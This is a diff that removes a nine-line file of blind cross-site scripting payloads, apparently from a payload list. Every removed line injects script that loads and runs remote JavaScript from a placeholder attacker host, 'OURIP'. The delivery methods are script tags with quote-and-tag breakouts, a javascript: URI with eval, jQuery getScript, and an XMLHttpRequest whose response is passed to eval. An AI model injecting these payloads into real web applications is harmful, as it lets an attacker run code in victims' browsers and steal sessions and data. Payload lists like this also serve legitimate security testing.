@@ -1,9 +1,0 @@
-<script src=http://OURIP/1></script>
-'><script src=http://OURIP/2></script>
-"><script src=http://OURIP/3></script>
-"><script src="http://OURIP/4"></script>
-"><script src=//OURIP/5></script>
-<script>$.getScript("//OURIP/6")</script>
-javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OURIP/7\';document.body.appendChild(a)')
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OURIP/8");a.send();</script>
-<script>$.getScript("http://OURIP/9")</script>
